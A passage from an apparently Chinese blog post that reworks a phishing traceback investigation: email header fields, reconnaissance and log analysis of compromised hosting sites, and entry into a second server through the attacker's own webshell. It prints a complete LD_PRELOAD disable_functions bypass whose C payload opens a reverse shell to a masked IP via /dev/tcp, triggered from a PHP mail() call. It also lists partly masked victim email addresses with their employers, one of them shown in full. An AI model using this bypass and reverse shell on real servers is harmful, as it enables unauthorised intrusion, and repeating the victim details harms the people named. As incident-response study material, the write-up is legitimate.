表示邮件建立的时间，既不是发送时间也不是接收时间，是邮件发送方创建邮件的时间。</p><p><strong>(3)From：</strong> 表示一个或多个<strong>邮件的作者，显示在正文的发件人</strong>。由发件方编辑，例如发垃圾的就会将此字段编辑成不存在的地址；发诈骗邮件的就会将此字段编辑成被冒充的邮件地址。</p><p><strong>(4)To：</strong> 表示邮件的接收地址。</p><p><strong>(5)CC：</strong> 表示抄送的邮件地址。</p><p><strong>(6)BCC：</strong> 表示密送的邮件地址。</p><p><strong>(7)Subject：</strong> 表示邮件的主题。</p><p><strong>(8)Sender：</strong> 表示邮件的实际投递者（只能是一个），一般由收件方添加，邮件服务商在收到邮件后会将邮件会话里面的实际投递者与信头From字段标识的发件这进行比较，如不一致则在信头下方加入Sender字段标识邮件实际投递者，但这个字段也可由发件方决定的(from 和 sender 不一致的情况下部分邮件服务商会有代发标识)。</p><p><strong>(9)Reply-to：</strong> 表示回复地址，由发件方编辑，希望收件人回复邮件时回复到指定的地址。一般情况下，如不额外添加Reply-to字段，收件人回复邮件时，将回复到原邮件From字段标识的地址。</p><p><strong>(10)MIME-Version：</strong> 表示MIME的版本。</p><p><strong>(11)Content-Type：</strong> 标识了邮件内容的格式。</p><p><strong>(12)Return-path：</strong> 标识指定的退信地址，一般情况下，不添加Return-path字段，退信默认退到Sender标识的地址。当Sender和From一致时，退信默认退到From标识的地址。</p><h2 id="0X02-找到用来钓鱼的网站进行漏洞挖掘"><a href="#0X02-找到用来钓鱼的网站进行漏洞挖掘" class="headerlink" title="0X02 找到用来钓鱼的网站进行漏洞挖掘"></a><strong>0X02 找到用来钓鱼的网站进行漏洞挖掘</strong></h2><h3 id="1-利用漏洞得到-shell"><a href="#1-利用漏洞得到-shell" class="headerlink" title="(1)利用漏洞得到 shell"></a><strong>(1)利用漏洞得到 shell</strong></h3><p>根据钓鱼链接找到攻击者用来放置钓鱼页面的网站，试图寻找攻击者利用的漏洞，这一步也需要大量的信息收集，原文作者收集到的信息如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[+] PORT: 使用 nmap -sS ip 进行扫描<br>[+] HOST: www.rosturxxxx.com 137.74.81.5 法国 <br>[+] OS: Red Hat 4.8 <br>[+] Web Server: Apache/2.4.6 OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 <br>[+] CMS: Joomla 3.3.3 Joomla!是一套海外流行的建站系统基于PHP+MySQL开发<br><br></code></pre></td></tr></table></figure><p>我对此也进行了相关的检测，但是发现可能由于管理员发现被入侵的原因，原网站已经不再是使用 joomla 而是使用了 wordpress(当然也是一个低版本的 wordpress4.4.3，真不知道管理是怎么想的….)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+]Web Server: nginx/1.14.1,PHP 5.4.45,MySQL5.5.5-10.0.37-MariaDB<br>[+]CMS: wordpress4.9.9<br><br></code></pre></td></tr></table></figure><p><strong>我选择尝试使用 WPScan 对其进行一些测试，看看最新的 wp 是不是依然会有攻击的可能</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: astra<br> | Location: http://rosturxxxx.com/wp-content/themes/astra/<br> | Last Updated: 2019-01-29T00:00:00.000Z<br> | Readme: http://rosturxxxx.com/wp-content/themes/astra/readme.txt<br> | Changelog: http://rosturxxxx.com/wp-content/themes/astra/changelog.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 1.6.8<br> | Style URL: http://rosturxxxx.com/wp-content/themes/astra/style.css<br> | Style Name: Astra<br> | Style URI: https://wpastra.com/<br> | Description: Astra is fast, fully customizable &amp; beautiful theme suitable <span class="hljs-keyword">for</span> blog, personal portfolio, business ...<br> | Author: Brainstorm Force<br> | Author URI: https://wpastra.com/about/<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.5.5 (80% confidence)<br> | Detected By: Style (Passive Detection)<br> |  - http://rosturxxxx.com/wp-content/themes/astra/style.css, Match: <span class="hljs-string">&#x27;Version: 1.5.5&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] astra-addon<br> | Location: http://rosturxxxx.com/wp-content/plugins/astra-addon/<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | The version could not be determined.<br><br>[+] contact-form-7<br> | Location: http://rosturxxxx.com/wp-content/plugins/contact-form-7/<br> | Last Updated: 2018-12-18T18:05:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 5.1.1<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 5.0.5 (100% confidence)<br> | Detected By: Query Parameter (Passive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.0.5<br> |  - http://rosturxxxx.com/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.0.5<br> | Confirmed By:<br> |  Readme - Stable Tag (Aggressive Detection)<br> |   - http://rosturxxxx.com/wp-content/plugins/contact-form-7/readme.txt<br> |  Readme - ChangeLog Section (Aggressive Detection)<br> |   - http://rosturxxxx.com/wp-content/plugins/contact-form-7/readme.txt<br><br>[+] elementor<br> | Location: http://rosturxxxx.com/wp-content/plugins/elementor/<br> | Last Updated: 2019-02-11T14:45:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.4.6<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 2.3.4 (100% confidence)<br> | Detected By: Query Parameter (Passive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=2.3.4<br> |  - http://rosturxxxx.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=2.3.4<br> | Confirmed By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/elementor/readme.txt<br><br>[+] elementor-pro<br> | Location: http://rosturxxxx.com/wp-content/plugins/elementor-pro/<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | The version could not be determined.<br><br>[+] essential-addons-for-elementor-lite<br> | Location: http://rosturxxxx.com/wp-content/plugins/essential-addons-for-elementor-lite/<br> | Last Updated: 2019-02-07T08:59:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.9.5<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 2.8.4 (100% confidence)<br> | Detected By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt<br> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt<br><br>[+] header-footer-elementor<br> | Location: http://rosturxxxx.com/wp-content/plugins/header-footer-elementor/<br> | Last Updated: 2019-02-15T12:35:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 1.1.2<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.0.16 (100% confidence)<br> | Detected By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/header-footer-elementor/readme.txt<br> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/header-footer-elementor/readme.txt<br><br>[+] woocommerce<br> | Location: http://rosturxxxx.com/wp-content/plugins/woocommerce/<br> | Last Updated: 2019-01-21T18:32:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.5.4<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> | Confirmed By: Meta Generator (Passive Detection)<br> |<br> | Version: 3.5.2 (100% confidence)<br> | Detected By: Query Parameter (Passive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=3.5.2<br> |  - http://rosturxxxx.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=3.5.2<br> |  - http://rosturxxxx.com/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=3.5.2<br> | Confirmed By:<br> |  Meta Generator (Passive Detection)<br> |   - http://rosturxxxx.com/, Match: <span class="hljs-string">&#x27;WooCommerce 3.5.2&#x27;</span><br> |  Translation File (Aggressive Detection)<br> |   - http://rosturxxxx.com/wp-content/plugins/woocommerce/i18n/languages/woocommerce.pot, Match: <span class="hljs-string">&#x27;&quot;Project-Id-Version: WooCommerce 3.5.2&#x27;</span><br><br>[+] wpforms-lite<br> | Location: http://rosturxxxx.com/wp-content/plugins/wpforms-lite/<br> | Last Updated: 2019-02-06T17:39:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 1.5.1<br> |<br> | Detected By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.4.9 (100% confidence)<br> | Detected By: Readme - ChangeLog Section (Aggressive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/wpforms-lite/readme.txt<br> | Confirmed By: Translation File (Aggressive Detection)<br> |  - http://rosturxxxx.com/wp-content/plugins/wpforms-lite/languages/wpforms.pot, Match: <span class="hljs-string">&#x27;&quot;Project-Id-Version: WPForms 1.4.9&#x27;</span><br><br></code></pre></td></tr></table></figure><p>可以发现这个网站虽然 wp 是最新版本，但是插件的版本都比较旧，还是存在攻击的可能</p><p>并且我在目录扫描的时候还发现了phpmyadmin 后台</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/undefined%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F.png" alt="此处输入图片的描述"></p><p><strong>当然，原作者在joomscan 测试无果的情况下考虑目录扫描和爆破备份文件的方法是值得我们去学习的，并且确实通过这种方式找到了备份文件并进入了phpmyadmin后台，由于不能写 shell,转而进入了 joomla 后台</strong></p><p>进入 joomla 后台后思路还是要利用后台的功能写 shell ，原作者这里使用的是写模板文件的方法。</p><h3 id="2-查看日志及shell获取攻击者ip信息"><a href="#2-查看日志及shell获取攻击者ip信息" class="headerlink" title="(2)查看日志及shell获取攻击者ip信息"></a><strong>(2)查看日志及shell获取攻击者ip信息</strong></h3><p>拿到 shell 以后首先的思路就是将攻击者的信息拿到，那么哪里有这些信息呢？一般在日志、shell和获取的钓鱼信息文件(<strong>这个文件是攻击者需要访问的，因为我们的目的就是溯源，故我们需要知道谁一直在访问这个文件获取信息，那么这个人大概率就是攻击者</strong>)里面有，于是将整个网站和日志打包以后放在 web 目录 使用 wget 下载到本地</p><p><strong>原作者使用 D 盾进行整站的 shell 检测，这样就不会遗漏，还是值得学习的</strong></p><p>确认了攻击者使用的 shell 以后就能通过日志查看哪些 ip 对其有所访问，这里使用命令 awk (作者对awk 的使用可以说是非常娴熟，自己还要多多磨炼)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali /tmp/rosturxxxxx.com/log grep <span class="hljs-string">&quot;/shells/&quot;</span> * |grep <span class="hljs-string">&quot;php&quot;</span> | awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |awk <span class="hljs-string">&#x27;&#123;a[$1]+=1;&#125; END &#123;for(i in a)&#123;print a[i]&quot; &quot;i;&#125;&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> -t <span class="hljs-string">&quot; &quot;</span> -k 1 -n -r &gt;ip.txt<br>26 174.85.xxx.99<br>20 50.73.xxx.169<br>10 213.233.xxx.120<br>2 207.228.xxx.69<br>2 195.211.xx.207<br>2 129.205.xxx.8<br><br></code></pre></td></tr></table></figure><p>然后又利用了一个 ip 地址查询接口获取了 ip 对应的国家</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali /tmp/rosturxxxxx.com/log <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(&lt;ip.txt); <span class="hljs-keyword">do</span> curl https://ip.cn/\?ip\=<span class="hljs-variable">$line</span> ; <span class="hljs-keyword">done</span><br>IP: 174.85.xxx.99 来自: 美国<br>IP: 50.73.xxx.169 来自: 美国<br>IP: 213.233.xxx.120 来自: 罗马尼亚<br>IP: 207.228.xxx.69 来自: 百慕大<br>IP: 195.211.xxx.207 来自: 俄罗斯<br>IP: 129.205.xxx.8 来自: 尼日利亚<br></code></pre></td></tr></table></figure><p>根据后门文件名匹配Apache访问日志得到攻击者的代理IP和User Agent</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali /tmp grep <span class="hljs-string">&quot;/shells&quot;</span> *| grep <span class="hljs-string">&quot;php&quot;</span> |grep <span class="hljs-string">&quot;POST&quot;</span> |awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2 $6&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> |<span class="hljs-built_in">uniq</span><br>129.205.xxx.8 - - [30/Nov/2018//www.rosturxxxx.com/shells/config.php<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36<span class="hljs-string">&quot;</span><br><span class="hljs-string">174.85.xxx.99 - - [27/Nov/2018//www.rosturxxxxx.com/shells/config.php&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;</span><br>207.228.xxx.69 - - [28/Nov/2018//www.rosturxxxxx.com/shells/config.php<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36<span class="hljs-string">&quot;</span><br><span class="hljs-string">213.233.xxx.120 - - [27/Nov/2018//www.rosturxxxxx.com/shells//bacu.php&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv</span><br><span class="hljs-string">50.73.xxx.169 - - [29/Nov/2018//www.rosturxxxxx.com/shells/config.php&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-通过日志匹配邮箱并去重得到受害者邮箱地址"><a href="#3-通过日志匹配邮箱并去重得到受害者邮箱地址" class="headerlink" title="(3)通过日志匹配邮箱并去重得到受害者邮箱地址"></a><strong>(3)通过日志匹配邮箱并去重得到受害者邮箱地址</strong></h3><p><strong>整个溯源过程还不能忘记受害者群体的分析，这将是窥探攻击者主要目的的关键所在，原作者在这方面做得也非常好，根据匹配到的邮箱对受害者的身份进行了确认。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali /tmp egrep <span class="hljs-string">&#x27;[0-Z_]&#123;1,&#125;@[0-Z]&#123;1,&#125;(\.[0-Z]&#123;1,&#125;)+&#x27;</span> * | awk -F <span class="hljs-string">&quot;\&quot;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |awk -F <span class="hljs-string">&quot;HTTP&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> |awk -F <span class="hljs-string">&quot;ml=&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> |<span class="hljs-built_in">uniq</span><br>alexxxx54@yahoo.com //攻击者邮箱<br>clavxxxx.xxxxx@lbdi.net //利比亚发展投行CFO<br>dennis@rayfields.co.za //域名失效<br>gexxxx.xxx@nera.net //新加坡IT基础设施提供商员工<br>gthxxxx@sscinc.com //美国SS&amp;C Technologies, Inc. 印度分公司<br>jasonchxxxxxx@gmail.com //攻击者邮箱<br>jiaxxxx.xxx@cimb.com //马来西亚联昌国际银行员工<br>kohcxxxxxx@bdo.com.sg //新加坡立信会计师事务所员工<br>mayfxxxxxxx@hotmail.com //未知<br>pxxxx@beekoo.hk //深圳市很有蜂格网络科技有限公司CEO<br>Poixxxx.xxx@sscinc.com //美国SS&amp;C Technologies, Inc.<br>shunxxxxxxxx@sscinc.com //美国SS&amp;C Technologies, Inc.疑似顺为资本<br>url@email.com //无效<br></code></pre></td></tr></table></figure><h2 id="0X03-转战邮件发送地址进行漏洞挖掘"><a href="#0X03-转战邮件发送地址进行漏洞挖掘" class="headerlink" title="0X03 转战邮件发送地址进行漏洞挖掘"></a><strong>0X03 转战邮件发送地址进行漏洞挖掘</strong></h2><p>我们知道，攻击者为了隐藏自身，同样会使用肉鸡来进行邮件的发送，因此想要确定攻击者的身份，渗透邮件发送的肉鸡是绝对不能少的步骤</p><h3 id="1-猜测-shell-名进行渗透"><a href="#1-猜测-shell-名进行渗透" class="headerlink" title="(1)猜测 shell 名进行渗透"></a><strong>(1)猜测 shell 名进行渗透</strong></h3><p>和之前一样，还是一套信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] HOST: mirohxxxxx.sk 85.248.xxx.150 斯洛伐克 <br>[+] OS: Debian 7 <br>[+] Web Server:Apache/2.2.22 PHP/5.2.6-1+lenny16 <br>[+] CMS: Joomla 1.5 <br><br></code></pre></td></tr></table></figure><p>由于该站已经被删除，我无法再做进一步的检测，只能跟着作者的思路进行分析，原作者在发下现网站的能利用的漏洞被攻击者修复了以后，没有着急着去使用旁站进行攻击而是根据对攻击者行为的揣测，根据两个cms <strong>都是较低版本的 joomala 推断出攻击者应该是批量入侵，于是想到木马应该有着相同或者类似的文件名，于是便在这台服务器上也成功发现了攻击者留下的的后门(这在某种意义上讲也是一种社会工程学的思路)</strong></p><p>这时候其实只要得到 shell 的密码就能掌控这台服务器，原作者一开始使用的是解密的方式获取明文密码，但是后来发现密码竟是 简单的 root <strong>这也提醒我们可以先做一些简单的爆破尝试，不成功再尝试解密，或许能更快地得到权限</strong></p><h3 id="2-突破限制反弹shell"><a href="#2-突破限制反弹shell" class="headerlink" title="(2)突破限制反弹shell"></a><strong>(2)突破限制反弹shell</strong></h3><p>和之前一样，我们的目的是溯源追踪攻击者，试图获取攻击者的信息，也就是我们还是需要拿到网站的日志，但是我们的 webshell 目前没有这个权限，不仅受到了 disable_function 的限制还受到了 open_basedir 的约束，因此现在的情况就是<strong>无法跨目录访问也无法执行命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">disable_functions escapeshellarg,escapeshellcmd,<span class="hljs-built_in">exec</span>,passthru,proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system,popen,pcntl_exec<br>   <br>open_basedir /storage/www/mirohxxxxx.sk/:/storage/www-include/:/usr/share/php5/:/usr/share/file/:/usr/share/pear/:/tmp/<br><br></code></pre></td></tr></table></figure><p><strong>因此我们需要将网站上的 shell 反弹到我们的 vps 上来突破我们的限制。</strong> 我简单的看了一下 disable_functions 发现并不是很严格，突破的方法其实有很多，原作者使用的是 LD_PRELOAD 的方式，这个方式可以说是一种比较复杂的方式了，正好用这个实例再学习巩固一下，关于 LD_PRELOAD 的具体一点的分析可以看<a href="https://www.freebuf.com/articles/web/192052.html">这篇文章</a>我的<a href="https://www.k0rz3n.com/2019/04/04/TCTF%202019%20%E7%BA%BF%E4%B8%8A%E8%B5%9B%20web%20%E9%A2%98%20writeup/">这篇文章</a>。</p><p><strong>可以通过命令查看 sendmail 函数执行过程中调用了那些库函数</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@m7web1:/tmp$ readelf -Ws /usr/sbin/sendmail<br>Symbol table <span class="hljs-string">&#x27;.dynsym&#x27;</span> contains 420 entries:<br>Num: Value Size Type Bind Vis Ndx Name<br>0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND<br>1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __printf_chk@GLIBC_2.3.4 (2)<br>2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getegid@GLIBC_2.2.5 (3)<br>3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dane_raw_tlsa@DANE_0_0 (4)<br>4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_ocsp_resp_print@GNUTLS_3_4 (5)<br>5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_x509_crt_get_serial@GNUTLS_3_4 (5)<br>6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __errno_location@GLIBC_2.2.5 (3)<br>7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_db_set_cache_expiration@GNUTLS_3_4 (5)<br>8: 0000000000000000 0 FUNC GLOBAL DEFAULT UND sendto@GLIBC_2.2.5 (3)<br>......<br>76: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getuid@GLIBC_2.2.5 (3)<br>77: 0000000000000000 0 FUNC GLOBAL DEFAULT UND send@GLIBC_2.2.5 (3)<br><br></code></pre></td></tr></table></figure><p>从中选取geteuid函数进行测试编写动态链接程序bypass.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>system(<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/999 0&gt;&amp;1&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">geteuid</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>当这个共享库中的geteuid被调用时尝试加载payload()函数执行命令调用system执行一个反弹shell的操作xxx.xxx.xxx.xxx即是我的公网服务器IP</p><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c -fPIC bypass.c -o bypass<br>gcc -shared bypass.c -o bypass.so<br><br></code></pre></td></tr></table></figure><p>上传</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@m7web1:/tmp$ <span class="hljs-built_in">cat</span> b64.txt|<span class="hljs-built_in">base64</span> -d &gt;bypass.so<br>www-data@m7web1:/tmp$ file bypass.so<br>file bypass.so<br>bypass.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)<br><br></code></pre></td></tr></table></figure><p>执行</p><p><strong>bypass.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/bypass.so&quot;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;test@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>浏览器访问<a href="http://www.mirohxxxxx.sk/bypass.php">http://www.mirohxxxxx.sk/bypass.php</a> 页面后成功执行命令得到了一个www-data权限的反弹shell</p><h3 id="3-新的线索新的世界"><a href="#3-新的线索新的世界" class="headerlink" title="(3)新的线索新的世界"></a><strong>(3)新的线索新的世界</strong></h3><p>根据原作者描述，在拿到反弹的 shell 以后还是没有权限去访问 apache 的日志，但是作者却在 tmp 目录下发现了一个遗留的有趣的日志文件，里面记录着一个 ip 地址，根据这个 ip 地址，原作者通过GoogleHacking 的手法 inurl:bc.php?filesrc&#x3D; 发现了攻击者已经删除的一些后门文件快照，里面得到了攻击者所在的组织的信息(<strong>顺路安利一下我原来整理的一些 GoogleHacking 